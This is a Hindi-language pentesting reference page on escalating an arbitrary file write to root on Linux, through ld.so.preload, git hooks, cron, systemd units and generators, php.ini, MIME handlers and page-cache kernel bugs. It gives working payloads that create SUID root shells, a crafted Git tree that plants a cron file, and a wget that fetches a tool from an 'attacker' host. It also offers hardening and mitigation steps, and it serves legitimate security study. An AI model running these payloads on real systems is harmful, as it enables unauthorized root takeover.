# Root के रूप में Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` shared objects की एक system-wide सूची है, जिन्हें dynamic linker अन्य shared objects से पहले load करता है। Secure-execution mode में preloading पर अतिरिक्त प्रतिबंध लागू होते हैं, इसलिए `/tmp/pe.so` जैसा library path SUID-binary की कोई सार्वभौमिक technique नहीं है।\
अगर आप इसे बना या संशोधित सकते हैं, तो इस फ़ाइल को load करने वाली process इसमें सूचीबद्ध library को अपने अन्य shared objects से पहले load करेगी, जिससे उस process के context में code execution संभव होगा।<sup>[[12]](#references)</sup>

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### constrained file write के रूप में OCR output

ऐसी OCR service, जो caller को सहेजे जाने वाले filename को चुनने देती है, पहचाने गए image text को **constrained file-write** primitive में बदल सकती है। सहेजे गए bytes पहचाना गया text होते हैं, image bytes नहीं, इसलिए syntax errors के लिए OCR output जाँचें। यदि अनुमत destination web-executable है और `.php` filename की अनुमति देता है, तो request किए जाने पर वह text execute हो सकता है। MakeSense में, locally reachable OCR application ने text को `/saved/` के अंतर्गत सहेजा; इसके root-run PHP server ने फिर सहेजी गई file को root के रूप में execute किया। Write उसी directory तक सीमित था; path traversal प्रदर्शित नहीं किया गया था।<sup>[[37]](#references)</sup>

Execution से मिलने वाला privilege **PHP-serving process** का होता है, OCR writer का अपने-आप नहीं। Destination की execution mapping और runtime identity की पुष्टि करें; root OCR writer और unprivileged web server होने पर PHP root के रूप में नहीं चलेगा।<sup>[[37]](#references)</sup> सीधे [web-root upload pattern](../../pentesting-web/file-upload/) से तुलना करें।

### Git hooks

**Git hooks** executable scripts होते हैं, जो repository में होने वाली घटनाओं—जैसे commit और merge operations—पर चलते हैं। यदि कोई **privileged script या user** ये actions करता है और attacker **`.git` folder** में **write** कर सकता है, तो hook का उपयोग **privilege escalation** के लिए किया जा सकता है।<sup>[[13]](#references)</sup>

उदाहरण के लिए, git repo में **`.git/hooks`** के अंतर्गत **script बनाना** संभव है, ताकि हर नया commit बनने पर वह execute हो:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export path traversal

एक privileged synchronizer checkout से बचने के लिए attacker-influenced repository को `git ls-tree` से enumerate कर सकता है, हर blob को `git cat-file` से पढ़ सकता है, रिपोर्ट किए गए pathname को staging directory के साथ जोड़ सकता है और उसे खुद लिख सकता है। जब वह `-c safe.directory=*` (जिससे Git का different-owner repository guard निष्क्रिय हो जाता है) का उपयोग करता है और destination containment check नहीं करता, तो यह **synchronizer के privileges के साथ arbitrary file write** बन जाता है। Absolute tree-entry name से Python का `os.path.join(stage, name)`, `stage` को छोड़ देता है; `../` वाला relative name filesystem द्वारा resolve किए जाने पर बाहर निकल जाता है। चूँकि application raw tree को materialize करता है, Git से checkout कराने के बजाय, इसलिए checkout-time pathname rejection कभी भी sink को सुरक्षित नहीं करता।<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Root services, timers, deployment agents, template importers और backup/restore jobs में इस code shape को खोजें:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Tree entry को `<mode> SP <name> NUL <raw object ID>` के रूप में encode किया जाता है। `git hash-object --literally` विकल्प जानबूझकर ऐसे object data की अनुमति देता है जिसे सामान्य parsing या `git fsck` अस्वीकार कर सकता है, इसलिए एक disposable clone ऐसा tree बना सकता है जिसका filename एक absolute destination हो। यह उदाहरण cron-file blob बनाता है, crafted tree को commit में लपेटता है और एक branch को उस पर ले जाता है; फिर भी exploitation के लिए उस repository को update करने की अनुमति चाहिए जिसे privileged job उपयोग करता है, और ऐसे Git server की आवश्यकता है जो malformed object स्वीकार करे।<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

सुरक्षा-मजबूती में repository ingestion और अंतिम filesystem operation, दोनों शामिल होने चाहिए:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` को उन सटीक repositories से बदलें जिन पर service को भरोसा करना चाहिए, और जहाँ संभव हो, repository processing को root privileges के बिना चलाएँ।
- Materialization से पहले absolute names और किसी भी `.` या `..` component को अस्वीकार करें। Join करने के बाद canonicalize करें और सत्यापित करें कि destination इच्छित root के भीतर ही रहे।
- Check-then-open symlink races से बचें: किसी trusted directory descriptor के सापेक्ष खोलें और Linux पर attacker-controlled paths के लिए `RESOLVE_BENEATH` तथा `RESOLVE_NO_SYMLINKS` के साथ `openat2()` का उपयोग करें।
- Plumbing output से checkout को फिर से लागू करने के बजाय, किसी isolated directory में सामान्य checkout को प्राथमिकता दें। यदि raw-object ingestion आवश्यक हो, तो `receive.fsckObjects=true` जैसी receive-side validation सक्षम करें; crafted trees को अस्वीकार करने के लिए आवश्यक pathname-related `receive.fsck.*` findings को कम गंभीर न करें।

### Privileged configuration deployment

कुछ management services इच्छित system state को configuration file में संग्रहीत करती हैं और बाद में उसे elevated privileges के साथ deploy करती हैं। उदाहरण के लिए, [openmediavault configuration को `/etc/openmediavault/config.xml` में संग्रहीत करता है](https://docs.openmediavault.org/en/7.x/faq.html), और उसका [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) service changes लागू कर सकता है। यदि कोई lower-privileged account उस file को लिख या बदल सकता है, तो जाँचें कि क्या वह अधिकृत deployment का अनुरोध भी कर सकता है और क्या चुना गया module बदले हुए field को root के रूप में उपयोग करता है। SSH account keys, scheduled commands और package installation की आवश्यकताएँ अलग-अलग होती हैं; केवल file का मौजूद होना या writable XML file होना इनमें से किसी का प्रमाण नहीं है। File और parent permissions, caller के groups और RPC authorization, installed version तथा वास्तविक consumer की जाँच करें—enumeration के दौरान configuration में बदलाव किए बिना या apply operation चलाए बिना।

`/etc/fail2ban/action.d/` के अंतर्गत Fail2Ban action definitions भी privileged configuration boundary हैं। जो user उस directory को लिख और search कर सकता है, वह action definition को बदल सकता है या override जोड़ सकता है, लेकिन केवल directory permissions से code execution साबित नहीं होता। पुष्टि करें कि कोई enabled jail वास्तव में प्रभावित action चुनता है, Fail2Ban service उसे higher privileges के साथ execute करती है, और अधिकृत reload/restart के बाद matching ban event होगा। Fail2Ban को restart करने की असंबंधित sudo permission तभी प्रासंगिक है जब वह ठीक उसी service invocation पर लागू हो और बदली हुई definition load की जाए। [Fail2Ban की action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) action-directory और jail के संबंध को दस्तावेज़ित करती है; इसका [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) दिखाता है कि `actionban` ban होने पर service user के अधिकारों के साथ चलता है। Enumeration के दौरान actions में बदलाव किए बिना या bans trigger किए बिना permissions और effective configuration की जाँच करें।

एक अलग boundary तब मौजूद होती है जब कोई enabled Fail2Ban jail WHOIS-enriched mail action का उपयोग करता है। [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) में untrusted WHOIS text को GNU mailutils `mail` में pipe किया गया था, जिसके escape processing से command चल सकती थी। Lower-privileged file writer response को प्रभावित कर सकता है, यदि वह **चुने गए WHOIS client** की server-override configuration बदल सकता हो; [Debian का `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) ऐसी एक file का दस्तावेज़ देता है, लेकिन इसका path और उपयोग installation के अनुसार बदलता है। Effective jail/action, service identity, वास्तविक WHOIS client और config path, mail implementation, response पर नियंत्रण, तथा installed vendor fix या backport की जाँच करें। Writable WHOIS configuration file, Fail2Ban version या mail action—इनमें से कोई भी अकेले इस chain को साबित नहीं करता; passive enumeration के दौरान किसी external server से query करने या bans trigger करने से बचें।

### TFTP file creation और privileged package hooks

सुलभ TFTP service container या local-user boundary को पार कर सकती है, यदि उसकी **effective** tftpd-hpa settings root के रूप में चलती हों, `--secure` directory के रूप में filesystem root को expose करती हों और `--create` सक्षम करती हों। [tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) creation और user options का वर्णन करता है। इससे किसी privileged configuration directory में नई file बनाई जा सकती है, जिसमें `/etc/apt/apt.conf.d/` भी शामिल है; फिर भी किसी मौजूदा file को बदलना संभव न हो सकता है। [APT का configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) `APT::Update::Pre-Invoke` commands का दस्तावेज़ देता है। Root के रूप में चलने वाला `apt update` higher-privilege consumer बन सकता है, **केवल तभी** जब वह नई configuration file को पढ़ता हो। चल रहे daemon के वास्तविक arguments और identity, network reachability और filtering, target-directory creation policy, APT का effective config scope तथा बाद में होने वाले privileged invocation की पुष्टि करें। Default file, writable target directory या scheduled APT command—इनमें से कोई भी अकेले पूरी प्रक्रिया को साबित नहीं करता। Passive triage के दौरान केवल सीमित स्थानीय configuration और metadata पढ़ें; file upload न करें और APT न चलाएँ।

### Cron और Time फ़ाइलें

यदि आप **root द्वारा execute की जाने वाली cron-related files लिख सकते हैं**, तो आमतौर पर अगली बार job चलने पर code execution प्राप्त कर सकते हैं। दिलचस्प targets में शामिल हैं:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` या `/var/spool/cron/crontabs/` में root की अपनी crontab
- `systemd` timers और वे services जिन्हें वे trigger करते हैं

त्वरित जाँचें:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

सामान्य दुरुपयोग के रास्ते:

- `/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में **एक नया root cron job जोड़ें**
- `run-parts` द्वारा पहले से निष्पादित की जाने वाली **स्क्रिप्ट बदलें**
- लॉन्च होने वाली स्क्रिप्ट या बाइनरी में बदलाव करके **मौजूदा timer target में backdoor डालें**

न्यूनतम cron payload का उदाहरण:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

यदि आप केवल run-parts द्वारा उपयोग की जाने वाली cron directory में लिख सकते हैं, तो इसके बजाय वहाँ एक executable file डालें:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

नोट्स:

- `run-parts` आमतौर पर उन फ़ाइलनामों को अनदेखा करता है जिनमें डॉट होते हैं, इसलिए `backup.sh` के बजाय `backup` जैसे नामों को प्राथमिकता दें।<sup>[[15]](#references)</sup>
- कुछ सिस्टम classic cron के बजाय `systemd` timers का उपयोग करते हैं, लेकिन दुरुपयोग का विचार वही है: **बदलें कि root बाद में क्या execute करेगा**।<sup>[[20]](#references)</sup>

### Service और Socket फ़ाइलें

अगर आप **`systemd` unit files** या उनके द्वारा संदर्भित फ़ाइलों में लिख सकते हैं, तो unit को reload और restart करके, या service/socket activation path के सक्रिय होने की प्रतीक्षा करके, root के रूप में code execution प्राप्त कर सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

system unit directory में लिखने और खोजने की अनुमति भी जाँचें, ACLs सहित: उपयोगकर्ता `/etc/systemd/system` में नई unit बना सकता है, भले ही directory को पढ़ने/सूचीबद्ध करने की अनुमति न हो। केवल यह path होने से कुछ शुरू नहीं होता। पुष्टि करें कि system manager नई unit को load करेगा, caller को उसके नाम के लिए प्रभावी root-capable `systemctl start` या `restart` अनुमति (या कोई अन्य privileged activation path) प्राप्त है, और service अपेक्षित identity के रूप में चलती है। डिस्क पर बदली गई किसी मौजूदा loaded unit के लिए `daemon-reload` की आवश्यकता हो सकती है; नए नाम वाली unit का loading behavior अलग होता है। wildcard restart rule को पर्याप्त मानने से पहले sudo के सटीक arguments और exclusions की जाँच करें। [systemd unit search path](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) और [systemctl loading and reload semantics](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) देखें।

दिलचस्प targets में शामिल हैं:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` में Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा संदर्भित Service scripts/binaries
- root service द्वारा load किए जाने वाले writable `EnvironmentFile=` paths

त्वरित जाँच:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

सामान्य दुरुपयोग के तरीके:

- ऐसी root-owned service unit में **`ExecStart=` को overwrite करें** जिसे आप modify कर सकते हैं
- malicious `ExecStart=` के साथ **drop-in override जोड़ें** और पहले पुराने `ExecStart=` को clear करें
- unit में पहले से referenced script/binary में **backdoor डालें**
- संबंधित `.service` file को modify करके **socket-activated service को hijack करें**, जो socket पर connection आने पर शुरू होती है

Malicious override का उदाहरण:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

सामान्य activation flow:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

अगर आप services को खुद restart नहीं कर सकते, लेकिन socket-activated unit को edit कर सकते हैं, तो आपको backdoored service को root के रूप में execute करवाने के लिए बस **किसी client connection का इंतज़ार** करना पड़ सकता है।<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators** ऐसे executables होते हैं जिन्हें unit files लोड करने से पहले system manager लॉन्च करता है—boot के दौरान और configuration reloads के दौरान भी। इसलिए, system-generator directory (या किसी मौजूदा executable generator) में write access, root-code-execution का एक सीधा तरीका है, जिसे आसानी से नज़रअंदाज़ किया जा सकता है, अगर audit में सिर्फ़ `*.service` और `*.timer` files की जाँच हो।<sup>[[35]](#references)[[36]](#references)</sup>

आम तौर पर खोज का क्रम `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, और `/usr/lib/systemd/system-generators/` होता है (कुछ distributions `/usr` merge के ज़रिए `/lib/systemd/system-generators/` उपलब्ध कराते हैं)। पहले directory में उसी नाम वाला executable, बाद वाली directory के executable को shadow करता है। इन **input executable directories** को `/run/systemd/generator`, `/run/systemd/generator.early`, और `/run/systemd/generator.late` के साथ भ्रमित न करें; इनमें generators द्वारा बनाया गया transient unit output होता है।<sup>[[35]](#references)</sup>

त्वरित जाँचें:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

नए बनाए गए generator का executable bit सेट होना चाहिए। यदि write primitive bytes को नियंत्रित करता है, लेकिन mode को नहीं, तो पहले से executable generator को लक्ष्य बनाएँ; उसे उसी जगह truncate करने से आम तौर पर उसका metadata बना रहता है। यदि directory स्वयं writable है, तो एक नई entry बनाएँ और उसे executable के रूप में चिह्नित करें।<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` को **system** manager पर चलाने के लिए उपयुक्त authorization आवश्यक है, लेकिन इससे हर system generator फिर से चलता है; अन्यथा किसी privileged reload, package operation या reboot का इंतज़ार करें। User-generator directories जैसे `~/.config/systemd/user-generators/` user manager के अंतर्गत execute होती हैं और अपने आप root access **नहीं** देतीं।<sup>[[35]](#references)</sup>

Hardening और hunting के लिए, केवल अंतिम mode bits नहीं, बल्कि हर path component और ACL की जाँच करें; generators के hashes/package ownership का baseline बनाएँ; और सभी system-generator input directories में create, rename, content या permission changes पर alert करें। Write को monitor करना महत्वपूर्ण है, क्योंकि one-shot generator execution के बाद खुद को delete कर सकता है, जबकि `/run/systemd/generator*` के अंतर्गत generated unit tree अगले reload पर फिर से बनाया जाता है।<sup>[[35]](#references)[[36]](#references)</sup>

### Privileged PHP sandbox द्वारा इस्तेमाल की जाने वाली restrictive `php.ini` को overwrite करना

कुछ custom daemons, user-supplied PHP को **restricted `php.ini`** (उदाहरण के लिए, `disable_functions=exec,system,...`) के साथ `php` चलाकर validate करते हैं। अगर sandboxed code में अब भी **कोई भी write primitive** (जैसे `file_put_contents`) मौजूद है और आप daemon द्वारा इस्तेमाल किए जाने वाले **exact `php.ini` path** तक पहुँच सकते हैं, तो restrictions हटाने के लिए आप उस **config को overwrite** कर सकते हैं और फिर elevated privileges के साथ चलने वाला दूसरा payload submit कर सकते हैं।<sup>[[2]](#references)</sup>

सामान्य flow:

1. पहला payload sandbox config को overwrite करता है।
2. दूसरा payload अब dangerous functions फिर से enabled होने के बाद code execute करता है।

न्यूनतम उदाहरण (daemon द्वारा इस्तेमाल किया जाने वाला path बदलें):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

यदि daemon root के रूप में चलता है (या root-owned paths से validate करता है), तो दूसरी execution से root context मिलता है। यह मूलतः **config overwrite के ज़रिए privilege escalation** है, जब sandboxed runtime अब भी files लिख सकता हो।

### binfmt_misc

`binfmt_misc`, `/proc/sys/fs/binfmt_misc` के अंतर्गत registrations उपलब्ध कराता है; हर registration किसी file-type pattern को एक interpreter से जोड़ता है। इसका privilege impact इस बात पर निर्भर करता है कि registration कौन बदल सकता है और बाद में matching file को कौन-सी process execute करती है। इसे privilege-escalation path मानने से पहले इन शर्तों की पुष्टि करें।<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE` वाला executable helper एक अलग registration path हो सकता है, यदि वह caller-controlled data स्वीकार करके उसे `/proc/sys/fs/binfmt_misc/register` में लिखता हो—भले ही caller स्वयं उस node में न लिख सके। Enumeration के दौरान helper को execute किए बिना उसके input और write behavior की समीक्षा करें। यदि registered rule में `C` flag है, तो interpreter को matched binary के आधार पर credentials मिलते हैं; इसलिए root-owned SUID match, caller-controlled interpreter को root के रूप में चला सकता है। `binfmt_misc` mount और registration policy, helper की effective capability, सटीक rule और interpreter path, executable SUID target, तथा यह पुष्टि करें कि `no_new_privs` या `nosuid` mount SUID transition को रोकता तो नहीं। केवल capability bit या embedded path string, समीक्षा के लिए एक संकेत है।<sup>[[21]](#references)</sup> SUID suppression की स्थितियों के लिए [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) देखें।

### Overwrite schema handlers (जैसे http: या https:)

Desktop environments, URI schemes के लिए application चुनने हेतु MIME associations और desktop entries का उपयोग करते हैं; यदि attacker संबंधित per-user configuration और desktop-entry directories में लिख सकता है, तो वह उन schemes को अपने नियंत्रण वाले launcher की ओर redirect कर सकता है। `$HOME/.config/mimeapps.list` file में बदलाव करके HTTP और HTTPS URL handlers को किसी malicious file की ओर इंगित करने से (उदाहरण के लिए, `x-scheme-handler/http=evil.desktop` और `x-scheme-handler/https=evil.desktop`), user के click से वह desktop entry invoke हो सकती है।<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root द्वारा user-writable scripts/binaries चलाना

अगर कोई privileged workflow `/bin/sh /home/username/.../script` (या किसी unprivileged user के स्वामित्व वाली directory के अंदर मौजूद कोई binary) चलाता है, तो आप उसे hijack कर सकते हैं:<sup>[[1]](#references)</sup>

- **Execution का पता लगाएँ:** root द्वारा user-controlled paths चलाए जाने का पता लगाने के लिए pspy से processes को monitor करें।<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **लिखने योग्य होने की पुष्टि करें:** सुनिश्चित करें कि target file और उसकी directory का ownership आपके user के पास हो और आप उनमें लिख सकें।
- **Target को hijack करें:** original binary/script का backup लें और ऐसा payload डालें जो SUID shell (या root पर कोई अन्य action) बनाए, फिर permissions बहाल करें:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **privileged action trigger करें** (उदाहरण के लिए, ऐसा UI button दबाएँ जो helper को spawn करता है)। जब root hijacked path को दोबारा execute करे, तो `./rootshell -p` से escalated shell प्राप्त करें।

### Privileged binaries में केवल page-cache फ़ाइल संशोधन

कुछ kernel bugs फ़ाइल को **disk पर** संशोधित नहीं करते। इसके बजाय, वे आपको किसी readable फ़ाइल की केवल **page cache copy** संशोधित करने देते हैं। यदि आप किसी **setuid** या किसी अन्य तरीके से **root द्वारा execute किए जाने वाले** binary को target कर सकते हैं, तो अगली execution memory से attacker-controlled bytes चला सकती है और privileges escalate कर सकती है, भले ही disk पर फ़ाइल का hash अपरिवर्तित रहे।<sup>[[3]](#references)[[4]](#references)</sup>

इसे **runtime-only file write primitive** के रूप में समझना उपयोगी है:<sup>[[3]](#references)</sup>

- **Disk साफ़ रहता है**: inode और disk पर मौजूद bytes नहीं बदलते
- **Memory में बदलाव होता है**: cached page को पढ़ने/execute करने वाली processes को attacker-modified content मिलता है
- **प्रभाव अस्थायी होता है**: reboot या cache eviction के बाद बदलाव गायब हो जाता है

यह primitive classic **arbitrary file write** और Dirty COW / Dirty Pipe जैसे पुराने **page-cache abuse** bugs के बीच आता है:<sup>[[3]](#references)</sup>

- Dirty COW एक race पर निर्भर था
- Dirty Pipe में write-position संबंधी सीमाएँ थीं
- यदि vulnerable path cached file-backed pages में सीधे writes देता है, तो page-cache-only primitive अधिक reliable हो सकता है

#### Generic privilege-escalation flow

1. ऐसा kernel primitive प्राप्त करें जो **file-backed page cache pages** में write कर सके
2. इसका इस्तेमाल किसी **readable privileged binary** या root द्वारा execute की जाने वाली किसी अन्य फ़ाइल पर करें
3. page के cache से evict होने से **पहले** execution trigger करें
4. root के रूप में code execution प्राप्त करें, जबकि disk पर मौजूद फ़ाइल अपरिवर्तित दिखती रहे

आमतौर पर उच्च-मूल्य वाले targets:

- **setuid-root** binaries
- **root services** द्वारा launch किए जाने वाले helpers
- **host kernel/page cache साझा करने वाले containers** से आमतौर पर execute किए जाने वाले binaries

#### AF_ALG + `splice()` उदाहरण path

Copy Fail (CVE-2026-31431) इस वर्ग का एक अच्छा उदाहरण है। Vulnerable path Linux crypto userspace API (`AF_ALG` / `algif_aead`) में था:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` readable फ़ाइल के page-cache pages के references को crypto TX scatterlist में ले जा सकता है
- in-place `algif_aead` decrypt path ने source और destination buffers का दोबारा इस्तेमाल किया
- इसके बाद `authencesn` ने destination tag region में write किया
- जब उस region में अभी भी spliced file-backed pages के references थे, तो write **target फ़ाइल के page cache** में हुआ

इसलिए दिलचस्प technique CVE खुद नहीं, बल्कि यह pattern है:

- **file-backed cache pages को kernel subsystem में डालें**
- subsystem से उन्हें writable output **मानने को कहें**
- memory में एक छोटा, नियंत्रित overwrite trigger करें

Public PoC ने `/usr/bin/su` को memory में patch करने के लिए बार-बार **4-byte writes** का इस्तेमाल किया और फिर उसे execute किया।<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone उदाहरण path

DirtyClone (CVE-2026-43503) इसी **page-cache-only write-to-root** pattern का एक और variant दिखाता है, लेकिन इस बार sink `AF_ALG` के बजाय **IPsec ESP decrypt** है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

यहाँ महत्वपूर्ण technique **metadata-laundering step** है:

- `splice()` एक **read-only file-backed page-cache page** को ESP-in-UDP packet में रखता है
- मूल DirtyFrag mitigation ने उस skb को `SKBFL_SHARED_FRAG` से tag किया था, ताकि `esp_input()` decrypt करने से **पहले copy करे**
- netfilter `TEE`, packet को `nf_dup_ipv4()` -> `__pskb_copy_fclone()` के ज़रिए duplicate करता है
- clone उसी **physical page-cache reference** को बनाए रखता है, लेकिन `SKBFL_SHARED_FRAG` खो देता है
- फिर `esp_input()` clone को सुरक्षित मानता है और file-backed page पर **in-place `cbc(aes)` decrypt** चलाता है

इसलिए reviewer के लिए सबक CVE से व्यापक है: यदि कोई mitigation यह तय करने के लिए **skb/page metadata** पर निर्भर करती है कि पहले copy करना ज़रूरी है या नहीं, तो कोई भी **clone/copy path जो backing page को बनाए रखता है, लेकिन metadata हटा देता है**, चुपचाप write primitive को फिर से खोल सकता है।

आमतौर पर exploitation flow:

1. **private network namespace के भीतर `CAP_NET_ADMIN` प्राप्त करने के लिए** `unshare(CLONE_NEWUSER | CLONE_NEWNET)` चलाएँ
2. loopback को up करें और `mangle/OUTPUT` में **netfilter `TEE` rule** install करें
3. `NETLINK_XFRM` के ज़रिए **XFRM ESP transport SAs** install करें
4. प्रत्येक target 4-byte word को SA के `seq_hi` field में encode करें (DirtyFrag की word-selection trick)
5. spliced ESP-in-UDP packet भेजें, ताकि **TEE clone** `esp_input()` तक पहुँचे और **in place** decrypt हो
6. तब तक दोहराएँ, जब तक `/usr/bin/su` या किसी अन्य privileged executable की page-cache copy में attacker-controlled code न आ जाए

व्यावहारिक रूप से, प्रभाव `AF_ALG` उदाहरण जैसा ही है: disk पर फ़ाइल साफ़ रहती है, लेकिन `execve()` **बदले हुए page-cache bytes** का उपयोग करता है और root access देता है।<sup>[[8]](#references)[[9]](#references)</sup>

इस variant के लिए उपयोगी exposure checks:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

अल्पकालिक attack-surface reduction भी यहाँ path-specific है: `48f6a5356a33` वाला kernel अपग्रेड करने से clone path ठीक हो जाता है, जबकि `xt_TEE` autoload को block करने से **flag-laundering step** हट जाता है और `esp4` / `esp6` को block करने से **decrypt sink** हट जाता है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### एक्सपोज़र और हंटिंग

अगर आपको इस तरह के bug का संदेह है, तो केवल disk integrity checks पर निर्भर न रहें। यह भी जाँचें:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

नीचे दिए गए कॉन्फ़िगरेशन मानों से पता चलता है कि कोई interface loadable है या kernel में built-in है; crypto build rules `CONFIG_CRYPTO_USER_API_AEAD` को `algif_aead` से map करते हैं।<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` को module के रूप में load/unload किया जा सकता है
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel में built-in है
- setuid binaries अच्छे targets हैं, क्योंकि page-cache-only patch किसी local foothold को root में बदलने के लिए पर्याप्त हो सकता है

#### `algif_aead` path के attack surface में कमी

यदि vulnerable interface किसी loadable module द्वारा उपलब्ध कराया जाता है:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

यदि इसे kernel में compile किया गया है, तो कुछ disclosures ने init path को block करने की सूचना दी:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

इस तरह के mitigation को अन्य kernel LPEs के लिए भी याद रखना उपयोगी है: यदि exploitation किसी विशिष्ट optional interface पर निर्भर करता है, तो उस interface को disable या blacklist करने से पूरा kernel upgrade उपलब्ध होने से पहले ही exploit path बाधित हो सकता है।<sup>[[6]](#references)[[28]](#references)</sup>



